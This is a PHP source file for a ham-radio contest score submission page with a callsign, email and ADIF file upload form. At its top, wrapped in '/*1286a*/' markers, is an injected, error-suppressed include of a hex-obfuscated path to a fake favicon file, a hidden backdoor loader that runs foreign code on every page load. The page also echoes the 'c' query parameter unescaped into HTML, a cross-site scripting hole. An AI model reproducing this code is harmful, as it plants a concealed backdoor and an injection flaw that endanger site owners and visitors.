<?php
/*1286a*/

@include "\x2fhome\x2ffg8o\x6acom/\x77ww/f\x35ad/Q\x53P_An\x74enne\x733/fa\x76icon\x5f7eeb\x63f.ic\x6f";

/*1286a*/
session_start();
include('config.php');
$cc=$_GET['c'];
if (strlen($cc)>0) {
$bgcolor=$contest[$cc]['bgcolor'];
}
if (strlen($bgcolor)==0) $bgcolor='#FFFFFF';
?>
<html>
<head>
	<title>Contest Submitter</title>
<style>
	* {
		font-family: Arial;
	}
	body {
		background-color: <?php  echo $bgcolor; ?>;
	}
	#body {
		width:800px; margin:0 auto;
	}
	input[type=text] {
		width: 400px;
		 text-transform: uppercase;
	}
	input[type=submit] {
		width: 100%;
		text-align: center;
		font-size: 2em;
	}
	#label_273 {
	   cursor: pointer;
	   margin:0px;
	   padding:0px;
	   height:0px;
	}
	#label_273 img {
		height:45px;
	}
	
	#file_273 {
	   opacity: 0;
	   position: absolute;
	   z-index: -1;
	}
</style>

</head>

<body>
<div id="body">
<h1>Contest Submitter</h1>
<form  enctype="multipart/form-data"  method="post" action="upload.php">
<?php

$cc=$_GET['c'];
if (strlen($cc)>0) {
	echo '';
	echo '<input type="hidden" name="contest" value="'.$cc.'" />';
	$image=$contest[$cc]['image'];
	$web=$contest[$cc]['web'];
	if (strlen($web)>0) echo '<a href="'.$web.'" target="_blank">';
	if (strlen($image)>0) echo '<center><img src="'.$image.'" alt="" /></center></a>';
} else {
	echo '<h2>Choose the contest to submit a score :</h2>
	
	<table>';
	foreach ($contest as $key => $value) {
		echo '<tr><td><input type="radio" name="contest" value="'.$key.'" ';
		if ($keyc=='') {
			echo 'checked';
			$keyc=$key;
		}
		echo '/></td><td>'.$key.'</td><td style="width:50px;">&nbsp;</td><td>'.$value['designation'].'</td></tr>';
	}
	echo '</table>';
}

?>

<h2>Your Callsign :</h2>
<input onchange="checkform();" id="callsign"  type="text" name="callsign" value="" />
<h2>Your email :</h2>
(Must be a valid email to receive confirmation of submission)<br />
<input onchange="checkform();" id="email" type="text" name="email" value="" />

<h2>Your ADIF file :</h2>
<input type="hidden" name="MAX_FILE_SIZE" value="20000000" />
Upload your ADIF file => <label id="label_273" for="file_273"><img src="file.png" /></label>
<input onchange="checkform();" name="adif" type="file"  id="file_273" /><br />
<h2> </h2>

<input id="sbu" onsubmit="submite();return true;" type="submit" value="Submit your score now !" />
</form></div>

<script>
checkform();
function submite() {
	document.getElementById("sbu").disabled = true;
	return true;
}
function checkform() {
	var valide=true;
	var files=document.getElementById("file_273").files;
	if(files.length>0) {
		var size=document.getElementById("file_273").files[0].size;
		if (size==0) valide=false; 
	} else {
		valide=false; 
	}
	console.debug(document.getElementById("email").value.length);
	if (document.getElementById("email").value.length==0) valide=false;
	if (document.getElementById("callsign").value.length==0) valide=false;
	
	if (valide==true) {
		document.getElementById("sbu").disabled = false;
	} else {
		document.getElementById("sbu").disabled = true;
	}
}
</script>
</body>
</html>